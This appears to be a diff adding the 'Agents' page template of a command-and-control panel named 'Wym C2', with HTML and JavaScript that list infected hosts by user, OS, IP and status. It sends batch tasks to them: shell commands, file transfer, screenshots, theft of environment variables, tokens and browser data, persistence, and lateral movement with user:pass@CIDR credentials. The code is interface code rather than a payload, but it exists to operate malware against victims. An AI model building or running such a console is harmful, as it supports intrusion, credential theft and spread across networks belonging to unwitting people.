@@ -1,0 +1,346 @@
+﻿{% extends "base.html" %}
+{% block title %}Agents - Wym C2{% endblock %}
+{% block content %}
+<div class="flex items-center gap-3 mb-4">
+  <h1 class="text-xl font-bold text-accent">Agents</h1>
+  <span class="text-xs text-muted">auto-refresh 5s</span>
+</div>
+
+<div class="flex flex-wrap items-center gap-3 mb-4">
+  <span class="inline-flex items-center gap-1.5 px-3 py-1 bg-dark-600 border border-dark-400 rounded-full text-sm">Total <span class="font-mono text-accent" id="m-total">0</span></span>
+  <span class="inline-flex items-center gap-1.5 px-3 py-1 bg-dark-600 border border-green-500/30 rounded-full text-sm">Alive <span class="font-mono text-green-400" id="m-alive">0</span></span>
+  <span class="inline-flex items-center gap-1.5 px-3 py-1 bg-dark-600 border border-yellow-500/30 rounded-full text-sm">Stale <span class="font-mono text-yellow-400" id="m-stale">0</span></span>
+  <span class="inline-flex items-center gap-1.5 px-3 py-1 bg-dark-600 border border-red-500/30 rounded-full text-sm">Dead <span class="font-mono text-red-400" id="m-dead">0</span></span>
+  <input type="search" id="agent-filter"
+    class="ml-auto w-64 bg-dark-800 border border-dark-400 rounded-lg px-3 py-1.5 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent focus:ring-1 focus:ring-accent/30 outline-none transition"
+    placeholder="filter host / user / os / ip..." autocomplete="off">
+</div>
+
+<div id="batch-bar" class="hidden flex items-center gap-3 mb-4 bg-dark-600 border border-accent/30 rounded-lg px-4 py-2.5">
+  <span class="text-sm text-muted"><b id="batch-count" class="text-accent">0</b> selected</span>
+  <select id="batch-type" class="bg-dark-800 border border-dark-400 rounded-lg px-3 py-1.5 text-sm font-mono text-gray-200 focus:border-accent outline-none">
+    <option value="shell">shell</option>
+    <option value="download">download</option>
+    <option value="upload">upload</option>
+    <option value="sleep">sleep</option>
+    <option value="screenshot">screenshot</option>
+    <option value="steal">steal</option>
+    <option value="persistence">persistence</option>
+    <option value="lateral">lateral</option>
+    <option value="exit">exit</option>
+  </select>
+  <input type="text" id="batch-payload" placeholder="command / file / seconds"
+    class="flex-1 min-w-[200px] bg-dark-800 border border-dark-400 rounded-lg px-3 py-1.5 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none">
+  <button id="batch-send" class="px-3 py-1.5 text-xs font-mono font-bold bg-accent/10 border border-accent/30 text-accent rounded-lg hover:bg-accent/20 transition cursor-pointer">Send</button>
+  <button id="batch-delete" class="px-3 py-1.5 text-xs font-mono font-bold bg-red-500/10 border border-red-500/30 text-red-400 rounded-lg hover:bg-red-500/20 transition cursor-pointer">Delete</button>
+  <button id="batch-clear" class="px-3 py-1.5 text-xs font-mono border border-dark-400 text-muted rounded-lg hover:text-gray-200 transition cursor-pointer">clear</button>
+</div>
+
+<!-- Batch result popup -->
+<div id="batch-modal" class="fixed inset-0 z-50 hidden">
+  <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" id="batch-modal-backdrop"></div>
+  <div class="relative w-full max-w-3xl mx-auto mt-24 bg-dark-600 border border-accent/30 rounded-xl shadow-2xl overflow-hidden">
+    <div class="flex items-center justify-between px-5 py-3 border-b border-dark-400 bg-dark-700">
+      <span class="text-sm font-bold text-accent uppercase tracking-wider">Batch Result</span>
+      <div class="flex items-center gap-3">
+        <span id="batch-modal-progress" class="text-xs font-mono text-muted"></span>
+        <button id="batch-modal-close" class="text-muted hover:text-accent transition p-1 cursor-pointer">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+        </button>
+      </div>
+    </div>
+    <div class="p-5">
+      <div id="batch-modal-type" class="text-xs font-mono text-muted uppercase tracking-wider mb-3"></div>
+      <div id="batch-modal-list" class="space-y-2 max-h-[60vh] overflow-y-auto">
+        <div class="text-sm text-muted">queuing...</div>
+      </div>
+      <div class="flex items-center justify-end pt-3 gap-2">
+        <span class="text-xs text-muted mr-auto" id="batch-modal-note"></span>
+        <button id="batch-modal-ok" class="px-4 py-1.5 text-xs font-mono font-bold bg-accent/10 border border-accent/30 text-accent rounded-lg hover:bg-accent/20 transition cursor-pointer">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="bg-dark-600 border border-dark-400 rounded-xl overflow-hidden">
+  <table class="w-full text-sm">
+    <thead>
+      <tr class="text-muted text-xs uppercase bg-dark-700 border-b border-dark-400">
+        <th class="px-3 py-2.5 w-10"><input type="checkbox" id="select-all" class="accent-[#00ff41]"></th>
+        <th class="text-left px-3 py-2.5">ID agent</th>
+        <th class="text-left px-3 py-2.5">Host</th>
+        <th class="text-left px-3 py-2.5">User</th>
+        <th class="text-left px-3 py-2.5">OS / Arch</th>
+        <th class="text-left px-3 py-2.5">Type / Version</th>
+        <th class="text-left px-3 py-2.5">IP</th>
+        <th class="text-left px-3 py-2.5">PID</th>
+        <th class="text-left px-3 py-2.5">First seen</th>
+        <th class="text-left px-3 py-2.5">Last seen</th>
+        <th class="text-left px-3 py-2.5">Status</th>
+        <th class="text-right px-3 py-2.5"></th>
+      </tr>
+    </thead>
+    <tbody id="agents-tbody">
+      <tr><td     colspan="12" class="px-3 py-8 text-center text-muted">loading...</td></tr>
+    </tbody>
+  </table>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  let AGENTS = [];
+  let SELECTED = new Set();
+  const filterInput = document.getElementById('agent-filter');
+  const selectAll = document.getElementById('select-all');
+  const batchBar = document.getElementById('batch-bar');
+  const batchCount = document.getElementById('batch-count');
+
+  filterInput.addEventListener('input', render);
+  selectAll.addEventListener('change', () => {
+    const visible = getVisible();
+    if (selectAll.checked) visible.forEach(a => SELECTED.add(a.id));
+    else visible.forEach(a => SELECTED.delete(a.id));
+    render();
+  });
+  document.getElementById('batch-send').addEventListener('click', sendBatch);
+  document.getElementById('batch-delete').addEventListener('click', deleteBatch);
+  document.getElementById('batch-clear').addEventListener('click', () => {
+    SELECTED.clear();
+    selectAll.checked = false;
+    render();
+  });
+
+  const batchType = document.getElementById('batch-type');
+  const batchPayload = document.getElementById('batch-payload');
+  function updateBatchPlaceholder() {
+    const t = batchType.value;
+    if (t === 'shell') batchPayload.placeholder = 'command';
+    else if (t === 'download') batchPayload.placeholder = 'file name in shared folder';
+    else if (t === 'upload') batchPayload.placeholder = 'absolute path on agent';
+    else if (t === 'sleep') batchPayload.placeholder = 'seconds (min 1)';
+    else if (t === 'screenshot') batchPayload.placeholder = 'filename label (optional)';
+    else if (t === 'steal') batchPayload.placeholder = 'all / env / tokens / browser';
+    else if (t === 'lateral') batchPayload.placeholder = 'subnet CIDR (optional) or user:pass@CIDR';
+    else if (t === 'persistence') batchPayload.placeholder = '--- (no args)';
+    else batchPayload.placeholder = '---';
+  }
+  batchType.addEventListener('change', updateBatchPlaceholder);
+  updateBatchPlaceholder();
+
+  setInterval(loadAgents, 5000);
+  loadAgents();
+
+  async function loadAgents() {
+    try {
+      const r = await fetch('/api/agents');
+      if (!r.ok) return;
+      AGENTS = (await r.json()).agents;
+      render();
+    } catch (e) {}
+  }
+
+  function getVisible() {
+    const q = filterInput.value.trim().toLowerCase();
+    return q
+      ? AGENTS.filter(a => [a.hostname, a.username, a.os, a.arch, a.ip, a.id]
+          .some(v => (v || '').toLowerCase().includes(q)))
+      : AGENTS;
+  }
+
+  function pill(status) {
+    const colors = {
+      alive: 'bg-green-500/10 border-green-500/30 text-green-400',
+      stale: 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400',
+      dead: 'bg-red-500/10 border-red-500/30 text-red-400',
+    };
+    return `<span class="inline-block px-2 py-0.5 text-xs font-mono border rounded-full ${colors[status] || ''}">${esc(status)}</span>`;
+  }
+
+  function shortId(id){
+    id = id || '';
+    return id.length > 12 ? id.slice(0, 8) + '-' : id;
+  }
+
+  function render() {
+    const tbody = document.getElementById('agents-tbody');
+    const total = AGENTS.length;
+    const alive = AGENTS.filter(a => a.status === 'alive').length;
+    const stale = AGENTS.filter(a => a.status === 'stale').length;
+    const dead  = AGENTS.filter(a => a.status === 'dead').length;
+    document.getElementById('m-total').textContent = total;
+    document.getElementById('m-alive').textContent = alive;
+    document.getElementById('m-stale').textContent = stale;
+    document.getElementById('m-dead').textContent = dead;
+
+    const list = getVisible();
+    if (!list.length) {
+      tbody.innerHTML = `<tr><td     colspan="12" class="px-3 py-8 text-center text-muted">${
+        AGENTS.length ? 'no agents match the filter' : 'no agents yet - deploy a client'
+      }</td></tr>`;
+      return;
+    }
+    tbody.innerHTML = list.map(a => {
+      const checked = SELECTED.has(a.id) ? 'checked' : '';
+      return `<tr class="border-b border-dark-400/50 hover:bg-dark-500/50 transition">
+          <td class="px-3 py-2"><input type="checkbox" class="agent-cb accent-[#00ff41]" data-id="${a.id}" ${checked}></td>
+          <td class="px-3 py-2"><a href="/agents/${a.id}" class="text-accent hover:underline font-mono text-xs" title="${esc(a.id)}">${shortId(a.id)}</a></td>
+          <td class="px-3 py-2 font-mono text-xs text-muted">${esc(a.hostname)}</td>
+          <td class="px-3 py-2 font-mono">${esc(a.username)}</td>
+          <td class="px-3 py-2 text-xs">${esc(a.os)} / ${esc(a.arch)}</td>
+          <td class="px-3 py-2 font-mono text-xs text-muted">${esc(a.type || '-')} / ${esc(a.version || '-')}</td>
+          <td class="px-3 py-2 font-mono text-xs">${esc(a.ip)}</td>
+          <td class="px-3 py-2 font-mono text-xs text-muted">${a.pid || '-'}</td>
+          <td class="px-3 py-2 text-xs text-muted" title="${esc(a.first_seen)}">${ago(a.first_seen)}</td>
+          <td class="px-3 py-2 text-xs text-muted" title="${esc(a.last_seen)}">${ago(a.last_seen)}</td>
+          <td class="px-3 py-2">${pill(a.status)}</td>
+          <td class="px-3 py-2 text-right">
+            <form method="post" action="/agents/${a.id}/delete" class="inline"
+                  onsubmit="return confirm('Delete agent ${esc(a.hostname)} and all its tasks?')">
+              <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}">
+              <button class="px-2 py-1 text-xs font-mono border border-red-500/30 text-red-400 rounded hover:bg-red-500/10 transition cursor-pointer">delete</button>
+            </form>
+          </td>
+        </tr>`;
+    }).join('');
+
+    batchCount.textContent = SELECTED.size;
+    batchBar.classList.toggle('hidden', SELECTED.size === 0);
+  }
+
+  document.getElementById('agents-tbody').addEventListener('change', e => {
+    if (!e.target.classList.contains('agent-cb')) return;
+    const id = e.target.dataset.id;
+    if (e.target.checked) SELECTED.add(id);
+    else SELECTED.delete(id);
+    batchCount.textContent = SELECTED.size;
+    batchBar.classList.toggle('hidden', SELECTED.size === 0);
+  });
+
+  let batchPollTimer = null;
+  let batchDone = false;
+
+  async function sendBatch() {
+    if (!SELECTED.size) return;
+    const taskType = document.getElementById('batch-type').value;
+    const payload = document.getElementById('batch-payload').value;
+    if (taskType === 'shell' && !payload) { showBatchModal('shell', [], 'enter a command', 'error'); return; }
+    if (!confirm(`Send "${taskType}" to ${SELECTED.size} agent(s)?`)) return;
+    try {
+      const r = await fetch('/api/batch/tasks', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json', 'X-CSRF-Token': CSRF_TOKEN},
+        body: JSON.stringify({ agent_ids: Array.from(SELECTED), task_type: taskType, payload: payload })
+      });
+      const d = await r.json();
+      if (!r.ok) {
+        showBatchModal(taskType, [], d.detail || ('error ' + r.status), 'error');
+        return;
+      }
+      openBatchPoll(taskType, d.tasks || []);
+    } catch (e) {
+      showBatchModal(taskType, [], 'network error: ' + e.message, 'error');
+    }
+  }
+
+  async function deleteBatch() {
+    if (!SELECTED.size) return;
+    if (!confirm(`Delete ${SELECTED.size} selected agent(s) and ALL their tasks + collected files? This cannot be undone.`)) return;
+    const ids = Array.from(SELECTED);
+    try {
+      const r = await fetch('/api/batch/agents/delete', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json', 'X-CSRF-Token': CSRF_TOKEN},
+        body: JSON.stringify({ agent_ids: ids })
+      });
+      const d = await r.json();
+      if (!r.ok) {
+        alert('batch delete failed: ' + (d.detail || ('error ' + r.status)));
+        return;
+      }
+      SELECTED.clear();
+      selectAll.checked = false;
+      await loadAgents();
+      alert(`Deleted ${d.deleted} agent(s).`);
+    } catch (e) {
+      alert('batch delete network error: ' + e.message);
+    }
+  }
+
+  function statusPill(status) {
+    const c = { completed: 'bg-green-500/10 border-green-500/30 text-green-400', failed: 'bg-red-500/10 border-red-500/30 text-red-400', pending: 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400', sent: 'bg-blue-500/10 border-blue-500/30 text-blue-400', cancelled: 'bg-gray-500/10 border-gray-500/30 text-gray-400' };
+    return `<span class="inline-block px-2 py-0.5 text-[10px] font-mono border rounded-full ${c[status] || ''}">${esc(status || '')}</span>`;
+  }
+
+  function taskRow(t) {
+    const out = (t.result || '').toString();
+    const preview = out.length > 180 ? out.substring(0, 180) + '-' : out;
+    return `<div class="border border-dark-400 rounded-lg overflow-hidden ${t.status==='completed'?'bg-dark-800/50':'bg-dark-800'}">
+      <div class="flex items-center justify-between px-3 py-2 bg-dark-700/50">
+        <span class="font-mono text-sm text-gray-200">${esc(t.hostname || t.agent_id || '?')}</span>
+        <div class="flex items-center gap-2">
+          ${statusPill(t.status)}
+        </div>
+      </div>
+      ${out ? `<pre class="px-3 py-2 text-xs font-mono text-gray-300 whitespace-pre-wrap overflow-x-auto max-h-40">${esc(preview)}</pre>` : ''}
+    </div>`;
+  }
+
+  function openBatchPoll(type, tasks) {
+    if (batchPollTimer) { clearInterval(batchPollTimer); batchPollTimer = null; }
+    batchDone = tasks.length === 0;
+    const modal = document.getElementById('batch-modal');
+    const listEl = document.getElementById('batch-modal-list');
+    const typeEl = document.getElementById('batch-modal-type');
+    const noteEl = document.getElementById('batch-modal-note');
+    typeEl.textContent = 'task type: ' + type + ' - ' + tasks.length + ' agent(s)';
+    noteEl.textContent = 'polling results...';
+    listEl.innerHTML = tasks.map(t => `<div class="text-sm text-muted">${esc(t.hostname)}: queued... <span class="inline-block w-3 h-3 border-2 border-accent/40 border-t-accent rounded-full animate-spin align-middle"></span></div>`).join('');
+    modal.classList.remove('hidden');
+
+    async function poll() {
+      try {
+        const r = await fetch('/api/batch/tasks/status', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json', 'X-CSRF-Token': CSRF_TOKEN},
+          body: JSON.stringify({ task_ids: tasks.map(t => t.task_id) })
+        });
+        const d = await r.json();
+        const rows = d.tasks || [];
+        listEl.innerHTML = rows.map(taskRow).join('') || '<div class="text-sm text-muted">no tasks</div>';
+        const doneCount = rows.filter(t => ['completed','failed','cancelled'].includes(t.status)).length;
+        const pendingCount = rows.filter(t => ['pending','sent'].includes(t.status)).length;
+        document.getElementById('batch-modal-progress').textContent = `${doneCount}/${rows.length} done`;
+        noteEl.textContent = pendingCount ? `waiting for ${pendingCount} agent(s)...` : 'all done';
+        if (rows.length > 0 && doneCount === rows.length) {
+          batchDone = true;
+          if (batchPollTimer) { clearInterval(batchPollTimer); batchPollTimer = null; }
+          noteEl.textContent = 'all tasks finished';
+          typeEl.textContent += ' - FINISHED';
+        }
+      } catch (e) {
+        noteEl.textContent = 'poll error: ' + e.message;
+      }
+    }
+    poll();
+    batchPollTimer = setInterval(poll, 2500);
+  }
+
+  function showBatchModal(type, tasks, detail, kind) {
+    if (batchPollTimer) { clearInterval(batchPollTimer); batchPollTimer = null; }
+    const modal = document.getElementById('batch-modal');
+    document.getElementById('batch-modal-type').textContent = 'task type: ' + type + (kind==='error' ? ' - ERROR' : '');
+    document.getElementById('batch-modal-progress').textContent = '';
+    document.getElementById('batch-modal-note').textContent = detail;
+    document.getElementById('batch-modal-list').innerHTML = `<div class="text-sm ${kind==='error'?'text-red-400':'text-muted'}">${esc(detail)}</div>`;
+    modal.classList.remove('hidden');
+  }
+  function closeBatchModal() {
+    if (batchPollTimer) { clearInterval(batchPollTimer); batchPollTimer = null; }
+    document.getElementById('batch-modal').classList.add('hidden');
+  }
+  document.getElementById('batch-modal-backdrop').addEventListener('click', closeBatchModal);
+  document.getElementById('batch-modal-close').addEventListener('click', closeBatchModal);
+  document.getElementById('batch-modal-ok').addEventListener('click', closeBatchModal);
+</script>
+{% endblock %}
